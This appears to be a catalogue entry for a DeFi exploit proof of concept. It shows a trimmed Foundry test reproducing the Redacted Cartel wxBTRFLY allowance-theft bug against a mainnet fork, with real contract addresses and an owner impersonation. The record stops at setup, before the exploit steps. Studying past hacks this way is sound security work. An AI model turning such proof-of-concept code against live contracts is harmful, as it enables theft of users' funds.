# [?] Redacted Cartel - Custom Approval Logic

## Summary
Severity: Unknown
Chain: Ethereum
Component: RedactedCartel
Published: 2022-03-29
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-03/RedactedCartel_exp.sol
Type: defi-exploit-poc

## Details
```solidity
// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

/*
Redacted Cartel Custom Approval Logic Exploit PoC

The vulnerability would have allowed a malicious attacker to assign a user’s allowance to themselves, enabling the attacker to steal that user’s funds.

a faulty implementation of standard transferFrom() ERC-20 function in wxBTRFLY token.
*/
contract RedactedCartelExploit is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IRedactedCartelSafeERC20 wxBTRFLY = IRedactedCartelSafeERC20(0x186E55C0BebD2f69348d94C4A27556d93C5Bd36C);

    address Alice = 0x9ee1873ba8383B1D4ac459aBd3c9C006Eaa8800A;
    address AliceContract = 0x0f41d34B301E24E549b7445B3f620178bff331be;
    address Bob = 0x78186702Bd66905845B469E3b76d4FD63F8722d4;
    address owner = 0x20B92862dcb9976E0AA11fAE766343B7317aB349; //owner of wxBTRFLY token

    function setUp() public {
        cheats.createSelectFork("mainnet", 13_908_185); //13908185

        // cheat.label(address(Alice), "Alice");
        // cheat.label(address(AliceContract), "AliceContract");
        // cheat.label(address(Bob), "Bob");
        // cheat.label(address(owner), "wxBTRFLYOwner");
    }

    function testExploit() public {
        //quick hack to bypass the "onlyAuthorisedOperators" modifier
        cheats.prank(owner);
        wxBTRFLY.unFreezeToken();

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-03/RedactedCartel_exp.sol_
